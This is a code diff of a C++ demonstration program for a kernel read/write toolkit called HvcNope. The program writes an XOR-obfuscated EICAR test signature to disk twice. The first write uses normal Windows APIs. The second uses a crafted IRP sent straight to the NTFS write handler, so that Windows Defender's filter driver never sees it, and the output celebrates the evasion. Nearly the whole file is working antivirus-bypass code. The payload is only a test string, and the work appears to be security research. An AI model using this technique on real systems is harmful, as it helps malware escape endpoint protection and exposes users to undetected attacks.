@@ -1,11 +1,9 @@
-﻿#include "Hvcnope.h"
-
-
 #include <iostream>
 #include <ntstatus.h>
 #include <vector>
 
-#include "MockDriver.h"
+#include <Hvcnope.h>
+#include <MockDriver.h>
 
 #include "kernel/functions.h"
 
@@ -25,13 +23,13 @@ unsigned char EicarSignatureXored[] = {
 const char* DetectableFileName = "Test1.txt";
 const char* UndetectableFileName = "Test2.txt";
 
-bool FileExists( const char* Filename )
+bool FileExists(const char* Filename)
 {
-    DWORD fileAttributes = GetFileAttributesA( Filename );
+    DWORD fileAttributes = GetFileAttributesA(Filename);
     return fileAttributes != INVALID_FILE_ATTRIBUTES;
 }
 
-bool RunTestUsermodeIo( std::vector<BYTE>& Signature )
+bool RunTestUsermodeIo(std::vector<BYTE>& Signature) 
 {
     std::cout << "[*] Running first test - writing EICAR to file with normal APIs\n";
 
@@ -42,7 +40,7 @@ bool RunTestUsermodeIo( std::vector<BYTE>& Signature )
         GENERIC_READ | GENERIC_WRITE,
         0,
         NULL,
-        CREATE_ALWAYS,
+        CREATE_ALWAYS, 
         FILE_ATTRIBUTE_NORMAL,
         0
     );
@@ -55,7 +53,7 @@ bool RunTestUsermodeIo( std::vector<BYTE>& Signature )
     // write EICAR to file - we might be stopped at the write itself,
     // but we should expect the file to be deleted anyways.
     //
-
+    
     DWORD writtenBytes = 0;
     BOOL written = WriteFile(
         maliciousFile,
@@ -66,31 +64,19 @@ bool RunTestUsermodeIo( std::vector<BYTE>& Signature )
     );
 
     if (!written || writtenBytes < Signature.size()) {
-        std::cerr << "[*] File failed to be written to, le=" << GetLastError() << std::endl;
+        std::cerr << "[*] File failed to be written to, le=" <<  GetLastError() << std::endl;
 
-        CloseHandle( maliciousFile );
+        CloseHandle(maliciousFile);
         return false;
     }
 
-    CloseHandle( maliciousFile );
+    std::cout << "[!] Written usermode file - defender should be angry:)" << std::endl;
 
-    // Wait for defender to delete the file
-    Sleep( 1000 );
-
-    int junk;
-    std::cin >> junk;
-
-    if (FileExists( DetectableFileName )) {
-        std::cerr << "[-] Test failed - defender didn't delete the file" << std::endl;;
-    }
-    else {
-        std::cout << "[+] Defender deleted the file!" << std::endl;
-    }
-
-    return TRUE;
+    CloseHandle(maliciousFile);
+    return TRUE;    
 }
 
-_DEVICE_OBJECT* GetVcbDeviceObject( KernelPtr<FILE_OBJECT>& FileObject )
+_DEVICE_OBJECT* GetVcbDeviceObject( KernelPtr<FILE_OBJECT>& FileObject ) 
 {
     // get VPB (volume parameter block)
     KernelPtr<VPB> vpb = FileObject->Vpb;
@@ -102,13 +88,11 @@ KernelPtr<IRP> CraftWriteIrp(
     void* InputBuffer,
     size_t InputSize,
     _DEVICE_OBJECT* DeviceObject,
-    IO_STATUS_BLOCK& Iosb )
+    IO_STATUS_BLOCK& Iosb) 
 {
-    constexpr CCHAR StackSize = 10;
+    constexpr CCHAR StackSize = 10; 
 
-    // TODO: KernelPtr writes fail hard
-
-    KernelPtr<IRP> irp = (PIRP)g_Invoker->CallKernelFunction( "IoAllocateIrp", StackSize, false );
+    KernelPtr<IRP> irp = IoAllocateIrp(StackSize, /*ChargeQuota=*/ false);
     irp->UserIosb = &Iosb;
 
     //
@@ -118,8 +102,8 @@ KernelPtr<IRP> CraftWriteIrp(
     irp->UserBuffer = InputBuffer;
 
     auto tail = irp->Tail;
-    tail.Overlay.OriginalFileObject = (PVOID)FileObject;
-    tail.Overlay.Thread = (PVOID)(PVOID)g_Invoker->CallKernelFunction( "KeGetCurrentThread" );
+    tail.Overlay.OriginalFileObject = (PVOID) FileObject;
+    tail.Overlay.Thread =  (PVOID) KeGetCurrentThread();
     irp->Tail = tail;
 
     KernelPtr<IO_STACK_LOCATION> stackLocation = tail.Overlay.CurrentStackLocation;
@@ -135,7 +119,7 @@ KernelPtr<IRP> CraftWriteIrp(
     return irp;
 }
 
-bool RunTestKernelIo( std::vector<BYTE>& Signature )
+bool RunTestKernelIo(std::vector<BYTE>& Signature)
 {
     std::cout << "[*] Running kernel I/O Test" << std::endl;
 
@@ -148,7 +132,7 @@ bool RunTestKernelIo( std::vector<BYTE>& Signature )
         GENERIC_READ | GENERIC_WRITE,
         0,
         NULL,
-        CREATE_ALWAYS,
+        CREATE_ALWAYS, 
         FILE_ATTRIBUTE_NORMAL,
         0
     );
@@ -164,27 +148,32 @@ bool RunTestKernelIo( std::vector<BYTE>& Signature )
     // Start off by getting the file object's address.
     //
 
-    std::optional<kAddress> pFileObjectType = g_KernelBinary->ResolveExport( "IoFileObjectType" );
+    std::optional<kAddress> pFileObjectType = g_KernelBinary->ResolveExport("IoFileObjectType");
     if (!pFileObjectType) {
         std::cerr << "Failed to resolve file object type" << std::endl;
-        CloseHandle( hMaliciousFile );
+        CloseHandle(hMaliciousFile);
         return false;
     }
-
-    LOG_DEBUG( "pFileObjectType: 0x%llx", pFileObjectType.value() );
-    PVOID IoFileObjectType = (PVOID)g_Rw->ReadQword( pFileObjectType.value() );
-    std::cout << "[*] IoFileObjectType: 0x" << std::hex << kAddress( IoFileObjectType ) << std::endl;
+    PVOID IoFileObjectType = (PVOID) g_Rw->ReadQword(pFileObjectType.value());
+    std::cout << "[*] IoFileObjectType: 0x" << std::hex << kAddress(IoFileObjectType) << std::endl;
 
     PFILE_OBJECT maliciousFile = nullptr;
-    NTSTATUS status = (NTSTATUS)g_Invoker->CallKernelFunction( "ObReferenceObjectByHandle", hMaliciousFile, (1) | (2), IoFileObjectType, UserMode, (PVOID*)&maliciousFile, 0 );
+    NTSTATUS status = ObReferenceObjectByHandle(
+        hMaliciousFile,
+        FILE_READ_DATA | FILE_WRITE_DATA,
+        IoFileObjectType,
+        UserMode,
+        (PVOID*) &maliciousFile,
+        nullptr
+    );
 
-    if (!NT_SUCCESS( status )) {
+    if (!NT_SUCCESS(status)) {
         std::cerr << "[-] Failed to get file object by handle, status=0x" << std::hex << status << std::endl;
-        CloseHandle( hMaliciousFile );
+        CloseHandle(hMaliciousFile);
         return false;
     }
 
-    std::cout << "[*] File object: 0x" << std::hex << kAddress( maliciousFile ) << std::endl;
+    std::cout << "[*] File object: 0x" << std::hex << kAddress(maliciousFile) << std::endl;
 
     //
     // Now we setup and send the IRP_MJ_WRITE IRP, to write our malicious signature
@@ -193,10 +182,10 @@ bool RunTestKernelIo( std::vector<BYTE>& Signature )
 
     // The IRP should be sent into the VCB's device object.
     KernelPtr<FILE_OBJECT> fileObject = maliciousFile;
-    _DEVICE_OBJECT* vcbDeviceObject = GetVcbDeviceObject( fileObject );
-    std::cout << "[*] VCB Device object: 0x" << std::hex << kAddress( vcbDeviceObject ) << std::endl;
-
-    IO_STATUS_BLOCK iosb = { 0 };
+    _DEVICE_OBJECT* vcbDeviceObject = GetVcbDeviceObject(fileObject);
+    std::cout << "[*] VCB Device object: 0x" << std::hex << kAddress(vcbDeviceObject) << std::endl;
+    
+    IO_STATUS_BLOCK iosb = {0};
 
     KernelPtr<IRP> irp = CraftWriteIrp(
         maliciousFile,
@@ -206,7 +195,7 @@ bool RunTestKernelIo( std::vector<BYTE>& Signature )
         iosb
     );
 
-    std::cout << "[*] About to send IRP 0x" << std::hex << kAddress( irp.get() ) << std::endl;
+    std::cout << "[*] About to send IRP 0x" << std::hex << kAddress(irp.get()) << std::endl;
 
     //
     // Theoretically possible to resolve this by getting the driver object \Filesystem\Ntfs
@@ -217,103 +206,57 @@ bool RunTestKernelIo( std::vector<BYTE>& Signature )
     kAddress _NtfsFsdWrite = 0;
     std::cin >> std::hex >> _NtfsFsdWrite;
 
-    PDRIVER_DISPATCH NtfsFsdWrite = (PDRIVER_DISPATCH)_NtfsFsdWrite;
+    PDRIVER_DISPATCH NtfsFsdWrite = (PDRIVER_DISPATCH) _NtfsFsdWrite;
 
     //
     // Invoke the IRP handler of NTFS directly, bypassing FltMgr and thus 
     // any attached filter drivers, including the one used by Windows Defender :)
     //
 
-    status = (NTSTATUS)g_Invoker->CallKernelFunction( kAddress( NtfsFsdWrite ), vcbDeviceObject, irp.get() );
-    if (!NT_SUCCESS( status )) {
+    status = NtfsFsdWrite(vcbDeviceObject, irp.get());
+    if (!NT_SUCCESS(status)) {
         std::cerr << "[-] Failed to process IRP, status=0x" << std::hex << status << std::endl;
-        CloseHandle( hMaliciousFile );
+        CloseHandle(hMaliciousFile);
         return false;
     }
 
     std::cout << "[+] IRP successfully received, " << iosb.Information << " malicious bytes written" << std::endl;
 
     // Wait for defender to supposedly do something
-    Sleep( 100 );
+    Sleep(100);
 
-    if (!FileExists( UndetectableFileName )) {
+    if (!FileExists(UndetectableFileName)) {
         std::cerr << "[-] File does not exist, maybe got caught in a scan?" << std::endl;
-        CloseHandle( hMaliciousFile );
+        CloseHandle(hMaliciousFile);
         return false;
     }
 
     std::cout << "[+] Aaaand defender didn't do anything about it" << std::endl;
-    std::cout << "[*] Enter any key to directly open the file using WinAPI." << std::endl;
-    std::cout << "If everything went right, defender will be very angry :)" << std::endl;
-
-    char junk;
-    std::cin >> junk;
-
-    CloseHandle( hMaliciousFile );
-
-    // open it again:)
-    hMaliciousFile = CreateFileA(
-        UndetectableFileName,
-        GENERIC_READ | GENERIC_WRITE,
-        0,
-        NULL,
-        OPEN_ALWAYS,
-        FILE_ATTRIBUTE_NORMAL,
-        0
-    );
-
-    if (hMaliciousFile == INVALID_HANDLE_VALUE) {
-        std::cout << "[+] Failed at open! le=" << GetLastError() << std::endl;
-        return true;
-    }
-
-    // still here? let's try to read from it
-
-    char buf[4];
-    DWORD readBytes = 0;
-
-    if (!ReadFile( hMaliciousFile, buf, sizeof( buf ), &readBytes, nullptr ))
-    {
-        std::cout << "[+] Failed at read! le=" << GetLastError() << std::endl;
-        return true;
-    }
-
-    // huh, weird. Let's wait a bit more just to be sure
-    std::cout << "[*] Successfully read bytes from file, let's wait a bit" << std::endl;
-    Sleep( 300 );
-
-    if (!FileExists( UndetectableFileName )) {
-        std::cout << "[+] File was deleted after read:)" << std::endl;
-        return true;
-    }
-
-    std::cerr << "[-] Something is off, try opening with notepad to be sure" << std::endl;
-    return false;
+    std::cout << "Feel free to open the test file, it won't be deleted soon:)" << std::endl;
+    return true;
 }
 
-int main()
+int main() 
 {
     // initialize HvcNope
-    HvcNope_Initialize( std::make_shared<MockDriverRw>() );
+    HvcNope_Initialize(std::make_shared<MockDriverRw>());
 
-    std::cout << "[*] Running demo" << std::endl;
     // initialize malicious signature
     std::vector<BYTE> eicar;
-    eicar.reserve( sizeof( EicarSignatureXored ) );
+    eicar.reserve(sizeof(EicarSignatureXored));
 
-    for (size_t i = 0; i < sizeof( EicarSignatureXored ); i++)
+    for (size_t i = 0; i < sizeof(EicarSignatureXored); i++)
     {
-        eicar.push_back( EicarSignatureXored[i] ^ 0x37 );
+        eicar.push_back(EicarSignatureXored[i] ^ 0x37);
     }
 
-
-    bool succeeded = RunTestUsermodeIo( eicar );
+    bool succeeded = RunTestUsermodeIo(eicar);
     if (!succeeded) {
         std::cerr << "[-] Failed usermode test" << std::endl;
         return 1;
     }
 
-    succeeded = RunTestKernelIo( eicar );
+    succeeded = RunTestKernelIo(eicar);
     if (!succeeded) {
         std::cerr << "[-] Failed kernel test" << std::endl;
         return 1;
